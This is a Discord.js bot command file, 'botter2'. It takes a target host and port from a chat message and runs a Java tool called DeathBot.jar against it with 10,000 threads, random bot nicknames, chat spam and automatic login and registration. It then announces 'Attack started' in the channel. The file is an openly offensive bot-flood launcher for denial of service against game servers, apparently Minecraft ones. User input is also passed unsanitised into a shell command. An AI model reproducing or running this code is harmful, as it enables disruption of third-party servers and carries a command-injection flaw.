const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar DeathBot.jar -move true -ping false -pingamount 10 -host ${host} -port ${port} -threads 10000 -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol 47 -msg !ExtremeHack -amount 10 -proxymode NONE -login /login qwert1234 -register /register qwert1234 qwert1234 -time 300 -debug true
pause`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('❖ Attack 2021')
	.setTimestamp()
	.setDescription("**❖ Bot** \n \n ❖ Attack started to: \n ❖ for 999 seconds")
	.setFooter('© Developer Matija#3553.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['botter2'],
  permLevel: 0
}

exports.help = {
  name: 'botter2',
  description: 'Özel',
  usage: 'botter'
}